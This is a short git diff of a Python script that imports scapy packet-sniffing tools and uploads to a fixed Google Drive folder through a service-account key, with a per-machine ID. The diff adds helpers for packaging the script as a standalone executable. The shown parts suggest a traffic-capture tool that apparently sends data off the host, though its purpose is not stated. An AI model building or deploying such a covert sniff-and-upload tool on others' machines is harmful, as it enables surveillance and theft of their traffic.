@@ -8,7 +8,7 @@ import scapy.all as scapy
 from scapy.layers import http
 import shutil, os
 import tarfile
-from apiclient.discovery import build
+from googleapiclient.discovery import build
 from oauth2client.service_account import ServiceAccountCredentials
 from httplib2 import Http
 from googleapiclient.http import MediaFileUpload
@@ -17,9 +17,21 @@ import scapy.all as scapy
 from scapy.sendrecv import AsyncSniffer
 from time import sleep
 
+def app_path():
+    if getattr(sys, 'frozen', False):
+        app_path = os.path.dirname(sys.executable)
+    elif __file__:
+        app_path = os.path.dirname(__file__)
+    return app_path
+
+def resource_path(relative_path):
+    if hasattr(sys, '_MEIPASS'):
+        return os.path.join(sys._MEIPASS, relative_path)
+    return os.path.join(os.path.abspath("."), relative_path)
+
 cwd=os.getcwd()
 scopes = ['https://www.googleapis.com/auth/drive']
-creds = ServiceAccountCredentials.from_json_keyfile_name('finalkey.json', scopes)
+creds = ServiceAccountCredentials.from_json_keyfile_name(resource_path('finalkey.json'), scopes)
 driveService = build('drive', 'v3', credentials=creds)
 parentDir='1cfjlBcYJPEdcHBoc3aa94zPvnUfJTCSm'
 UUID=hex(uuid.getnode())
